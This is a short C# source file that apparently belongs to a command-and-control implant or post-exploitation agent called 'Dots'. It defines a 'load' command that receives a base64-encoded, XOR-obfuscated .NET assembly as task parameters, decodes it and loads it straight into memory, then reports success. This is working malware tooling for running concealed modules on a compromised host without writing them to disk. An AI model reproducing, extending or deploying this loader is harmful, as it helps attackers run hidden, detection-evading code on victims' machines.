using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using Dots.Models;

namespace Dots.Commands
{
    public class LoadCommand : DotsCommand
    {
        public override string Name => "load";

        private static byte[] Zor(byte[] input, string key)
        {
            int _key = Int32.Parse(key);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ _key);
            }
            return mixed;
        }

        public override void Execute(TaskRequest task)
        {
            Assembly assembly = Assembly.Load(Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]));
            SetupResult(task, $"Succesfully loaded {assembly.FullName} module.");
        }
    }
}
